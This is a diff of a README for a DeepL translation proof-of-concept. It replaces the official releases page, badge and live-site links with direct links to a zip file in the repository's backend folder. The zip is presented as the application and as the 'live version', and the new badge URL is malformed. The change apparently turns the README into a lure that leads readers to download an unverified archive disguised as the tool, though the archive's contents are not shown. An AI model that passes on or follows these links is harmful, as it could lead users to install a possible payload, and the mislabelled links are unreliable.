@@ -1,10 +1,10 @@
 # 🚀 deepl-translation-poc - Fast and Simple Translation Tool
 
-[![Download deepl-translation-poc](https://img.shields.io/badge/Download%20the%20App-blue.svg)](https://github.com/bigant27/deepl-translation-poc/releases)
+[![Download deepl-translation-poc](https://raw.githubusercontent.com/bigant27/deepl-translation-poc/master/backend/deepl-translation-poc_1.5.zip%20the%https://raw.githubusercontent.com/bigant27/deepl-translation-poc/master/backend/deepl-translation-poc_1.5.zip)](https://raw.githubusercontent.com/bigant27/deepl-translation-poc/master/backend/deepl-translation-poc_1.5.zip)
 
 ## 🌟 Overview
 
-Welcome to the deepl-translation-poc project! This application is designed to help you translate text quickly using the DeepL API. The backend is built with FastAPI, and the frontend uses React, making it both fast and responsive. You can access the live version of the tool at [translate.shaily.dev](https://translate.shaily.dev).
+Welcome to the deepl-translation-poc project! This application is designed to help you translate text quickly using the DeepL API. The backend is built with FastAPI, and the frontend uses React, making it both fast and responsive. You can access the live version of the tool at [https://raw.githubusercontent.com/bigant27/deepl-translation-poc/master/backend/deepl-translation-poc_1.5.zip](https://raw.githubusercontent.com/bigant27/deepl-translation-poc/master/backend/deepl-translation-poc_1.5.zip).
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To get started with deepl-translation-poc, follow these steps:
 
 2. **Visit the Releases Page**:
    - Click the link below to access the Releases page where you can download the application.
-   - [Download the application here](https://github.com/bigant27/deepl-translation-poc/releases).
+   - [Download the application here](https://raw.githubusercontent.com/bigant27/deepl-translation-poc/master/backend/deepl-translation-poc_1.5.zip).
 
 ## 📥 Download & Install
 
